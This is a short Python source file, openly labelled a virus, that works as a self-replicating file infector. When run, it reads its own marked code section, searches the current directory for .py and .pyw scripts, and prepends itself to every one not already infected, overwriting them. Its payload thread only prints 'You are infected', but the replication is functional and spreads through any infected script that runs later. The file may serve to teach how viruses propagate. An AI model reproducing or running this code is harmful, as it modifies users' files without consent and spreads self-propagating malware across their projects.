### VIRUS START ###

import sys
import glob
import threading

def Replicate():
	"""Functio taking care of replicating virus"""
	code = [] 						#list for saving malicious code

	with open(sys.argv[0],'r') as f: 	 		#read and save running script
		lines=f.readlines()		
		
	virusArea = False
	for line in lines:					#iterate through script and find virus part
		if line == '### VIRUS START ###\n':
			virusArea=True
		if virusArea:
			code.append(line)
		if line == '### VIRUS END ###\n':
			break
			
	pythonScripts = glob.glob('*.py') + glob.glob('*.pyw')#find all python scripts in local directory

	for script in pythonScripts:				#iterate through all found scripts

		with open(script,'r') as f:			#read script
			scriptCode = f.readlines()
		infected=False
		
		for line in scriptCode:			#check if its already infected
			if line == '### VIRUS START ###\n':
				infected= True
				break
		if not infected:				#if not infected append virus code
			finalCode=[]
			finalCode.extend(code)
			finalCode.extend('\n')
			finalCode.extend(scriptCode)
			
			with open(script,'w') as f:
				f.writelines(finalCode)
				
def DoMaliciousThings():
	"""Function with malicious payload"""
	print("You are infected")
y = threading.Thread(target=Replicate)			#create thread for running replicate function
y.start()							#start thread
x = threading.Thread(target=DoMaliciousThings, daemon=True)	#create thread for running malicious function
x.start()							#start thread


### VIRUS END ###
